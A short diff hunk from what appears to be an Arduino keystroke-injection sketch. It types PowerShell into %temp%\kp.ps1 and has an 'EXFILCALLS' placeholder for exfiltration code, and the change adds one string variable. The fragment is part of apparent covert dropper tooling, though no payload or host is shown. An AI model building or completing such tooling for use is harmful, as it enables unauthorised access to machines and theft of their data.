@@ -95,6 +95,7 @@ void setup(){
   Keyboard.println("echo $read = 0 } >> %temp%\\kp.ps1");
 
   String fn = "kp";
+  String fp;
   EXFILCALLS
 
   
